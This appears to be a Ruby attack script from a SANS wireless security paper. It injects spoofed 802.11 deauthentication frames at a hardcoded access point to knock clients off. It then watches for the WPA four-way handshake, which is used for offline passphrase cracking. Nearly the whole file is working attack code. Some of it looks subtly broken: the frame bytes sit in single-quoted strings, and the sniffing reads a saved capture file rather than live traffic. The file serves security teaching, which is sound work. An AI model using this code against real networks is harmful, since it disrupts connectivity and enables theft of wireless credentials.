#!/usr/bin/ruby
########################################
#
# This code is part of the SANS/GIAC Gold Paper titled
#
# Programming Wireless Security
#
# by Robin Wood (dninja@gmail.com), accepted May 2008
#
# For more information you can find the paper in the "Wireless Access" section of the
# SANS Reading Room at http://www.sans.org/reading_room/ or at www.digininja.org
#
########################################
require 'scruby'

$datastore = Hash.new("Unknown")
$datastore["INTERFACE"] = "ath0"
$datastore["CHANNEL"] = 11
$datastore["DRIVER"] = "madwifing"

begin
	require "Lorcon"
	@lorcon_loaded = true
rescue ::Exception => e
	@lorcon_loaded = false
	@lorcon_error  = e
end

if (not @lorcon_loaded)
	puts ("The Lorcon module is not available: #{@lorcon_error.to_s}")
	raise RuntimeError, "Lorcon not available"
end

# XXX: Force the interface to be up
system("ifconfig", $datastore["INTERFACE"], "up")

wifi = ::Lorcon::Device.new($datastore["INTERFACE"], $datastore["DRIVER"])
wifi.fmode      = "INJECT"
wifi.channel    = 11
wifi.txrate     = 2
wifi.modulation = "DSSS"

if (not wifi)
	raise RuntimeError, "Could not open the wireless device interface"
end

destination_addr = "\xff\xff\xff\xff\xff\xff"
bss_id_addr = "\x00\x0e\xa6\xce\xe2\x28"
source_addr = bss_id_addr

packet = '\xc0\x00\x01\x00'
packet = packet + destination_addr
packet = packet + source_addr
packet = packet + bss_id_addr
packet = packet + '\x00\x00'
packet = packet + '\x80\xcb\x70\x00'

def deauth (wifi, packet, packet_count)
	wifi.write(packet, packet_count, 0)
end

module Scruby
	$tracking = {}

	def SniffEAPOL(pcap, packet)
		datalink = pcap.datalink
		if (datalink == 127)
		
		#pp $tracking

			dissect = Scruby.RadioTap(packet)
			if (dissect.has_layer(WPA_key))
				puts "*****************************"
				dot11 = dissect.get_layer(Dot11).layers_list[0]

				if ((dot11.FCfield & 1) == 1)
					sta = dot11.addr2
				elsif ((dot11.FCfield & 2) == 2)
					sta = dot11.addr1
				else
					puts "unknown"
					return
				end

				if (not $tracking.has_key?(sta))
					fields = { 
						'frame2' => nil,
						'frame3' => nil,
						'frame4' => nil,
						'replay_counter' => nil,
						'packets' => []
					}

					$tracking[sta] = fields
				end

				wpa_key = dissect.get_layer(WPA_key).layers_list[0]

				key_info = wpa_key.Info
				wpa_key_length = wpa_key.ExtraLength
				replay_counter = wpa_key.ReplayCounter

				wpa_key_info_install = 64
				wpa_key_info_ack = 128
				wpa_key_info_mic = 256

				#pp replay_counter
				# check for frame 2
				if (((key_info & wpa_key_info_mic) == wpa_key_info_mic) and 
					((key_info & wpa_key_info_ack) == 0) and 
					((key_info & wpa_key_info_install) == 0) and 
					(wpa_key_length.to_i > 0)) :
					puts "found packet 2 for ", sta
					$tracking[sta]['frame2'] = 1
					$tracking[sta]['packets'] = $tracking[sta]['packets'] + [packet]

				# check for frame 3
				elsif ((key_info & wpa_key_info_mic) == wpa_key_info_mic and 
					(key_info & wpa_key_info_ack) == wpa_key_info_ack and 
					(key_info & wpa_key_info_install) == wpa_key_info_install):
					puts "found packet 3 for ", sta
					$tracking[sta]['frame3'] = 1
					# store the replay counter for this sta
					$tracking[sta]['replay_counter'] = replay_counter
					$tracking[sta]['packets'] = $tracking[sta]['packets'] + [packet]

				# check for frame 4
				elsif (((key_info & wpa_key_info_mic) == wpa_key_info_mic) and 
					((key_info & wpa_key_info_ack) == 0) and 
					((key_info & wpa_key_info_install) == 0) and 
					$tracking[sta]['replay_counter'] == replay_counter):
					puts "Found packet 4 for ", sta
					$tracking[sta]['frame4'] = 1
					$tracking[sta]['packets'] = $tracking[sta]['packets'] + [packet]
				end

				if ($tracking[sta]['frame2'] == 1 and $tracking[sta]['frame3'] == 1 and $tracking[sta]['frame4'] == 1):
					puts "Handshake Found\n\n"
					# Write out packets here
					# wrpcap ("/var/gold/ruby.pcap", $tracking[sta]['packets'])
					handshake_found = 1
					exit
				end
			end
		end
	end
end

scruby = ScrubyBasic.new

10.times do
	puts "Deauth Attack\n"
	deauth(wifi, packet, 150)
	puts "Deauth done, sniffing for EAPOL traffic"
	scruby.sniff(:offline=>"/var/gold/non_zero.pcap", :prn=>"SniffEAPOL")
end

puts "Finished"
